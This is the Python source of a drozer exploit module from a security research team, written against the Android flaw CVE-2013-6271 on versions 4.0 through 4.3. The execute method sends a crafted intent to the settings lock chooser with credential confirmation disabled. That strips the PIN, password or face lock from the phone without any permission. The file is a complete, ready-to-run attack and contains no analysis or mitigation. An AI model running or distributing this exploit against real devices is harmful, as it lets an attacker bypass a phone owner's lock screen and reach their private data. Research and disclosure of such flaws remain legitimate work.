"""
CVE-2013-6271

http://www.curesec.com
by Curesec Research Team security@curesec.com

Tested to be VULN:
4.0
4.1
4.2
4.3

Tested NOT VULN:
4.4
"""

from drozer import android
from drozer.modules import common, Module

#comment in to start ipython
#from IPython import embed



class unlock(Module):

	name = "Exploit CVE-2013-6271 delete all locks on phone :)"
	description = "This plugin abuses a bug which allows a malicious app/user to use the com.android.phone without the necessary permissions."
	examples = "run curesec.exploit.unlock"
	author = "security@curesec.com"
	date = "2014-6-25"
	license = "BSD (3-clause)"
	path = ["curesec", "exploit"]

	def usagecallme(self):
	   self.stderr.write("Name: Exploit CVE-2013-6271 delete all locks on phone :)\n")
	   self.stderr.write("Desc: This plugin abuses a bug which allows a malicious app/user to delete all security lock settings like pin/password/facelock. No extra permissions needed.\n")
	   self.stderr.write("Author: security@curesec.com\n")
	   self.stderr.write("Examples:\nrun curesec.exploit.unlock\n\n")


	def execute(self, arguments):

		self.stdout.write("[+] Exploiting CVE-2013-6271 - Removing all set locks!\n")

		#well we do not need to define the None's, but for the fun of it lets do it :)
		act = None
		cat = None
		comp = ['com.android.settings','com.android.settings.ChooseLockGeneric']
		data = None
		extr = [['boolean', 'confirm_credentials', 'false'], ['integer','lockscreen.password_type', '0']]
		flgs = ['ACTIVITY_NEW_TASK']

		#build the intent
		intent = android.Intent(action=act, category=cat, data_uri=data, component=comp, extras=extr, flags=flgs)

		#debug, comment in to use ipython
		#embed()
		if intent.isValid():
			self.getContext().startActivity(intent.buildIn(self))
		else:
			self.stderr.write("[-] Invalid!\n")
